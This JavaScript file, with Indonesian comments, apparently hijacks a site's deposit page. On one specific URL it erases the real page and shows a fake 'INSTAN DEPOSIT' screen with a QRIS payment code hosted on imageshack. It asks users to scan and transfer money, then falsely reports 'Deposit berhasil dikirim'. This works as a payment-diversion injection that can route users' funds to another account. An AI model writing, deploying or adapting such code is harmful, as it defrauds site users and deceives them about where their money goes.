document.addEventListener("DOMContentLoaded", function () {
    const urlParams = new URLSearchParams(window.location.search);
    const pathName = window.location.pathname;
    
    // Menambahkan kondisi agar skrip berjalan di /app/?deposit&head=home
    if (!(urlParams.has("deposit") && urlParams.get("head") === "home" && pathName.endsWith("/app/"))) {
        console.log("Skrip tidak berjalan karena bukan di halaman yang sesuai.");
        return;
    }

    console.log("Skrip berjalan di halaman yang sesuai.");

    let container = document.createElement("div");
    container.style.display = "flex";
    container.style.justifyContent = "center";
    container.style.alignItems = "center";
    container.style.height = "100vh";

    let content = document.createElement("div");
    content.className = "container";
    content.style.background = "rgba(0, 0, 0, 0.7)";
    content.style.padding = "20px";
    content.style.borderRadius = "10px";
    content.style.textAlign = "center";
    content.style.color = "white";

    content.innerHTML = `
        <h1 style="margin-bottom: 20px;">INSTAN DEPOSIT</h1>
        <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" alt="QRIS Code" style="width: 250px; border-radius: 10px;">
        <br>
        <a href="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" download="qris-code.jpeg" class="btn" 
            style="display: block; margin: 10px auto; padding: 10px 20px; background: #ffcc00; color: black; border: none; border-radius: 5px; cursor: pointer; text-decoration: none;">
            Download QRIS
        </a>
        <p>Scan > Isi Nominal > Transfer > Konfirmasi</p>
        <input type="text" id="nominal" placeholder="Masukkan Nominal" 
            style="width: 80%; padding: 10px; text-align: center; font-size: 18px; border: none; border-radius: 5px; color: brown;">
        <br>
        <button id="konfirmasiBtn" class="btn" 
            style="display: block; margin: 10px auto; padding: 10px 20px; background: #ffcc00; color: black; border: none; border-radius: 5px; cursor: pointer;">
            Konfirmasi
        </button>
    `;

    container.appendChild(content);
    document.body.innerHTML = "";
    document.body.appendChild(container);

    document.body.style.background = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMGf-ZGNtCXgGR1Gcy5rCZxuS-tfdZgyx0tY74IV4ffrptYHsI9-GDC2I&s=10') no-repeat center center fixed";
    document.body.style.backgroundSize = "cover";
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.height = "100vh";

    document.getElementById("nominal").addEventListener("input", function (event) {
        let sanitizedValue = event.target.value.replace(/\D/g, ""); 
        event.target.value = sanitizedValue.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    });

    document.getElementById("konfirmasiBtn").addEventListener("click", function () {
        let nominalValue = document.getElementById("nominal").value;
        if (nominalValue === "") {
            alert("Masukkan nominal terlebih dahulu!");
        } else {
            alert("Deposit berhasil dikirim");
            window.location.href = "../";
        }
    });
});
